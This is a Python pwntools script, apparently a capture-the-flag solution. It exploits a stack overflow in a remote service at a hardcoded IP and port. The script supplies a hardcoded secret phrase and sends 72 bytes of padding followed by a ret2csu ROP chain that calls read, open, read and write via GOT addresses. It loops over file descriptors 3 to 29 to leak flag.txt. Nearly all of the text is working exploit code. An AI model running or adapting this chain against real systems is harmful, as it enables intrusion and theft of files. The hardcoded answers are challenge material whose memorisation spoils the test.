#!/usr/bin/env python3
from pwn import *
context.arch='amd64'
context.log_level='error'

HOST='154.57.164.77'; PORT=32702
csu_pop=0x401512; csu_call=0x4014f8; pop_rdi=0x4011f2
got_read=0x403250; got_write=0x403230; got_open=0x403278
bm=0x404200; bp=0x404100

def probe_fd(fd):
    r=remote(HOST,PORT)
    r.sendlineafter(b'secret phrase:',b's34s0nf1n4l3b00')
    r.recvuntil(b'wish for next year:')
    pay=b'A'*72
    # 1) read(0, bm, 32) — marker
    pay+=p64(csu_pop)+p64(0)+p64(1)+p64(0)+p64(bm)+p64(32)+p64(got_read)
    pay+=p64(csu_call)+p64(0)+p64(0)*6
    # 2) read(0, bp, 40) — path
    pay+=p64(csu_pop)+p64(0)+p64(1)+p64(0)+p64(bp)+p64(40)+p64(got_read)
    pay+=p64(csu_call)+p64(0)+p64(0)*6
    # 3) open(bp, 0, 0)
    pay+=p64(csu_pop)+p64(0)+p64(1)+p64(bp)+p64(0)+p64(0)+p64(got_open)
    pay+=p64(csu_call)+p64(0)+p64(0)*6
    # 4) read(fd, bm, 0x100)
    pay+=p64(csu_pop)+p64(0)+p64(1)+p64(fd)+p64(bm)+p64(0x100)+p64(got_read)
    pay+=p64(csu_call)+p64(0)+p64(0)*6
    # 5) write(1, bm, 48)
    pay+=p64(csu_pop)+p64(0)+p64(1)+p64(1)+p64(bm)+p64(48)+p64(got_write)
    pay+=p64(csu_call)+p64(0)+p64(0)*6

    r.send(pay)
    import time; time.sleep(0.5)
    # Send all data at once: 32B marker + 40B path
    r.send(b'MARKER:ZZZZZZZZZZZZZZZZZZZZZZZ'[:32].ljust(32,b'\x00') +
           b'flag.txt\x00'.ljust(40,b'\x00'))
    time.sleep(2)
    try:
        # Try recv with long timeout
        data=r.recv(timeout=6)
        if b'MARKER:' in data:
            idx=data.index(b'MARKER:')
            mo=data[idx:idx+48]
            if b'ZZZZ' in mo: 
                print(f'fd={fd}: UNCHANGED')
                return 'unchanged'
            else: 
                print(f'fd={fd}: CHANGED -> {mo}')
                if b'{' in mo: print(f'*** FLAG! ***')
                return 'changed'
        else:
            # Maybe data is not in marker format, print last non-null
            clean = data.replace(b'\x00',b'').strip()
            print(f'fd={fd}: no marker -> {clean[:100]}')
            return 'nomarker'
    except EOFError: print(f'fd={fd}: EOF'); return 'eof'
    except Exception as e: print(f'fd={fd}: {e}'); return 'error'
    finally: r.close()

for fd in range(3, 30):
    res = probe_fd(fd)
    if res == 'changed':
        print('FOUND!')
        break
